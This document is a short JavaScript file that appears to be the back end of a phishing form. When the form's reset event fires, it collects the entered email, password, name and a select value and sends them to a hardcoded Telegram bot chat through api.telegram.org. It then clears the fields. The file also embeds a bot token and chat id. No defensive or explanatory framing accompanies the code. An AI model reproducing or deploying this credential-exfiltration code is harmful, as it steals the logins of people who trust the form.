const form = document.querySelector("#form");

form.addEventListener("reset", (e) => {
  e.preventDefault();

  var text1 = document.getElementById("text1").value;
  var text2 = document.getElementById("text2").value;
  var text3 = document.getElementById("text3").value;
  var select = document.getElementById("select").value;

  var my_text = `Result is:%0A  Email: ${text1} %0A  Password: ${text2} %0A Select:${select} %0A Name: ${text3}`

  var token = "6828743971:AAGaeYKy1OWI5MagfokwkJhNzsXz25z1PVA";

  var chat_id = -1002136672014
  var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`

  let api = new XMLHttpRequest();
  api.open("GET", url, true);
  api.send();

  console.log("yetkazildi");


  document.getElementById('form').addEventListener('reset', function () {
    setTimeout(function () {
        document.getElementById('text1').value = '';
        document.getElementById('text2').value = '';
        document.getElementById('text3').value = '';
        document.getElementById('select').selectedIndex = 0;
    }, 0);
});

});
